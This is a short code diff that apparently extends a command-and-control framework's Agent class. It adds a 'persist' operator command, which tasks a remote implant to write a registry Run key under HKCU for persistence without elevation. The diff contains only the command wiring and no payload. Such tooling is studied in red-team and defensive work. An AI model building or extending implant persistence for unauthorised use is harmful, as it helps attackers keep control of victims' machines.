@@ -29,6 +29,7 @@ class Agent:
         self.menu.registerCommand("shell", "Execute a shell command against Linux and Windows agents", "<command>")
         self.menu.registerCommand("powershell", "Execute a powershell command. Works as shell alias for Linux agents", "<command>")
         self.menu.registerCommand("sleep", "Change agent's sleep time.", "<time (s)>")
+        self.menu.registerCommand("persist", "Create new registry value in \nHKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n No elevate privileges needed", "")
         self.menu.registerCommand("clear", "Clear tasks.", "")
         self.menu.registerCommand("quit", "Task agent to quit.", "")
 
@@ -72,6 +73,10 @@ class Agent:
             pass
         
         return 0
+        
+    def persist(self):
+        self.writeTask("persist")	
+     	
 
     def shell(self, args):
 
@@ -152,6 +157,8 @@ class Agent:
             self.sleep(args)
         elif command == "clear":
             self.clearTasks()
+        elif command == "persist":
+            self.persist()   
         elif command == "quit":
             self.QuitandRemove()
 
